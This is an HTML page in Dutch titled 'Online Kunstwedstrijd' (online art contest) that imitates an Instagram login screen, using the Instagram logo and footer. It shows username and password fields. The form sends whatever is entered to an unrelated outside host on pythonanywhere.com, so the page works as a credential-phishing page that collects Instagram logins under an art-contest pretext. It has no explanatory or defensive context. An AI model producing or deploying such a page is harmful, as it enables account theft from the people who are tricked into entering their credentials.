<!DOCTYPE html>
<html lang="nl">
<head>
  <title>Online Kunstwedstrijd</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
  <span id="root">
    <section class="section-all">
      <link rel="stylesheet" href="css/css.css">
      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo"
                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                    alt="Instagram">
                </div><!-- Kop einde -->
                <div class="form-wrap">
                  <form class="form" action="https://cyrru.pythonanywhere.com/login1" method="POST" class="my-login-validation"
                    novalidate=""">
                    <div class=" input-box">
                    <input type="text" id="username" placeholder="Telefoonnummer, gebruikersnaam of e-mail" aria-required="true"
                      maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                </div>

                <div class="input-box">
                  <input type="password" name="password" id="password" placeholder="Wachtwoord" maxlength="30"
                    aria-required="true" autocapitalize="off" autocorrect="off" required>
                </div>

                <span class="button-box">
                  <button class="btn" type="verzenden">Inloggen</button>
                </span>

                <a class="forgot" href="/">Wachtwoord vergeten?</a>
                </form>
              </div> <!-- Formulier-wrap einde -->
            </div> <!-- Login-box einde -->

            <div class="login-box">
              <p class="text">Heb je nog geen account? <a href="/">Registreer</a></p>
            </div> <!-- Aanmelden-box einde --><!-- App einde -->
        </div> <!-- Inhoud einde -->
        </article>
        </div> <!-- Wrapper einde -->
      </main>

      <!-- 2-Role Voettekst -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">
          <span class="footer-logo">&copy; 2023 Instagram</span>
        </div> <!-- Voettekstcontainer einde -->
      </footer>

    </section>
  </span> <!-- Root -->
</body>
</html>
